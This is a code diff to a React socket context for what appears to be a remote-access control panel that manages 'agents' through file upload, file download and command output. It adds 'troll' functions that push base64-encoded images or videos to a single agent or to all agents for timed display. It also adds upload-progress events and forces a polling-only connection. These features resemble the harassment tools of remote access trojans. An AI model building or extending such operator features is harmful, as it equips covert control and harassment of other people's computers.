@@ -47,6 +47,8 @@ interface SocketContextType {
   uploadFile: (agentId: string, file: File, destinationPath: string) => void;
   downloadFile: (agentId: string, filename: string) => void;
   previewFile?: (agentId: string, filename: string) => void;
+  trollShowImage?: (agentId: string | null, file: File, opts?: { duration_ms?: number; mode?: 'cover' | 'contain' | 'fill' }) => void;
+  trollShowVideo?: (agentId: string | null, file: File, opts?: { duration_ms?: number }) => void;
   commandOutput: string[];
   addCommandOutput: (output: string) => void;
   clearCommandOutput: () => void;
@@ -306,7 +308,8 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
       socketInstance = io(socketUrl, {
         withCredentials: true,
         path: '/socket.io',
-        transports: ['websocket', 'polling'],
+        transports: ['polling'],
+        upgrade: false,
         timeout: 20000,
         reconnection: true,
         reconnectionAttempts: 20,
@@ -1147,6 +1150,12 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
           chunk: chunkB64,
           offset,
         });
+        try {
+          const sent = Math.min(file.size, offset + bytes.length);
+          const progress = Math.max(0, Math.min(99, Math.round((sent / file.size) * 100)));
+          const event = new CustomEvent('file_upload_progress', { detail: { agent_id: agentId, filename: file.name, destination_path: destinationFilePath, total: file.size, received: sent, progress } });
+          window.dispatchEvent(event);
+        } catch {}
         await new Promise((r) => setTimeout(r, chunkDelayMs));
       }
       socket.emit('upload_file_complete', {
@@ -1156,6 +1165,10 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
         destination: destinationDir || '',
         total_size: file.size,
       });
+      try {
+        const event = new CustomEvent('file_upload_complete', { detail: { agent_id: agentId, filename: file.name, destination_path: destinationFilePath, size: file.size, success: true } });
+        window.dispatchEvent(event);
+      } catch {}
     })().catch((error) => {
       addCommandOutput(`Upload failed: ${error?.message || String(error)}`);
     });
@@ -1171,6 +1184,41 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
       });
       addCommandOutput(`Downloading ${filename} from ${agentId}`);
     }
+  }, [socket, connected, addCommandOutput]);
+
+  const trollShowImage = useCallback(async (agentId: string | null, file: File, opts?: { duration_ms?: number; mode?: 'cover' | 'contain' | 'fill' }) => {
+    if (!socket || !connected) return;
+    const buffer = await file.arrayBuffer();
+    const bytes = new Uint8Array(buffer);
+    const b64 = bytesToBase64(bytes);
+    const mime = detectMimeFromBytes(bytes, file.name);
+    const payload: any = {
+      filename: file.name,
+      mime,
+      image_b64: b64,
+      duration_ms: typeof opts?.duration_ms === 'number' ? opts?.duration_ms : 5000,
+      mode: opts?.mode || 'cover'
+    };
+    if (agentId) payload.agent_id = agentId;
+    socket.emit('troll_show_image', payload);
+    addCommandOutput(`Troll image sent: ${file.name}${agentId ? ` → ${agentId}` : ' → ALL'}`);
+  }, [socket, connected, addCommandOutput]);
+
+  const trollShowVideo = useCallback(async (agentId: string | null, file: File, opts?: { duration_ms?: number }) => {
+    if (!socket || !connected) return;
+    const buffer = await file.arrayBuffer();
+    const bytes = new Uint8Array(buffer);
+    const b64 = bytesToBase64(bytes);
+    const mime = detectMimeFromBytes(bytes, file.name);
+    const payload: any = {
+      filename: file.name,
+      mime,
+      video_b64: b64,
+      duration_ms: typeof opts?.duration_ms === 'number' ? opts?.duration_ms : 8000,
+    };
+    if (agentId) payload.agent_id = agentId;
+    socket.emit('troll_show_video', payload);
+    addCommandOutput(`Troll video sent: ${file.name}${agentId ? ` → ${agentId}` : ' → ALL'}`);
   }, [socket, connected, addCommandOutput]);
 
   const previewFile = useCallback((agentId: string, filename: string) => {
@@ -1265,6 +1313,8 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
     uploadFile,
     downloadFile,
     previewFile,
+    trollShowImage,
+    trollShowVideo,
     commandOutput,
     addCommandOutput,
     clearCommandOutput,
